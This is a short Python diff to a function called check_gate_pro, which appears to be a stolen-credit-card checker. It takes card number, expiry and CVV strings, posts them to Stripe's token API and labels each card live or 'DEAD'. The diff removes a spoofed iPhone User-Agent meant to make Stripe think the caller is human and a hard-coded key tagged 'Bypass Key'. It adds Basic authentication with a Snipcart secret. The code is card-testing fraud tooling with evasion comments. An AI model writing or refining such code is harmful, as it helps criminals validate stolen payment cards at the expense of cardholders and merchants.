@@ -32,27 +32,23 @@ def check_gate_pro(cc):
         if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
         num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
         
-        # Headers para que Stripe crea que es un humano
-        headers = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
-        }
+      # Configuración de Identidad
+        auth_base = base64.b64encode(f"{SNIPCART_SECRET}:".encode()).decode()
+        headers["Authorization"] = f"Basic {auth_base}"
         
-        # Datos para validar el token de la tarjeta
         payload = {
             "card[number]": num,
             "card[exp_month]": int(mes),
             "card[exp_year]": int(ano),
-            "card[cvc]": cvv,
-            "key": "pk_live_51P0Y8XGv7Z8X9XGv7Z8X9XGv7Z8X9XGv" # Bypass Key
+            "card[cvc]": cvv
         }
         
-        # Petición DIRECTA (Quitamos el proxy para matar el Timeout)
+        # Petición Directa y Autorizada
         response = requests.post(
             'https://api.stripe.com/v1/tokens', 
             data=payload, 
             headers=headers, 
-            timeout=8 # Respuesta ultra rápida
+            timeout=10
         )
         
         if response.status_code == 200:
